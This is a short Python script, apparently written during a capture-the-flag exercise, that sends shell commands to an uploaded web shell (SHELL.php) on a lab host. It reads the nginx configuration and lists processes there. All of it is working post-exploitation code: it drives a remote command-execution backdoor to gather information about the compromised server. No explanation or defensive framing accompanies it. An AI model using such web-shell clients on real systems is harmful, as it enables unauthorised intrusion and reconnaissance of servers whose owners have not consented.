import urllib.request, urllib.parse

# Check nginx config for user directive
url = "http://10.129.26.34/files/SHELL.php?c=cat+/etc/nginx/nginx.conf+2>%261&"+ urllib.parse.urlencode({"c": "grep -i user /etc/nginx/nginx.conf 2>&1; awk '/events/ {found=0} {if(found) print} /http/ {found=1}' /etc/nginx/nginx.conf 2>&1 | head -20; ps aux 2>&1 | grep nginx | head -5; echo DONE"})
# This won't work with two c params, let me just encode a single command
url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": "cat /etc/nginx/nginx.conf 2>&1"})
headers = {"Host": "support_001.enigma.htb"}
req = urllib.request.Request(url, headers=headers)
try:
    resp = urllib.request.urlopen(req, timeout=10)
    result = resp.read().decode("utf-8", errors="replace").strip()
    print(result[:2000])
except Exception as e:
    print(f"Error: {e}")
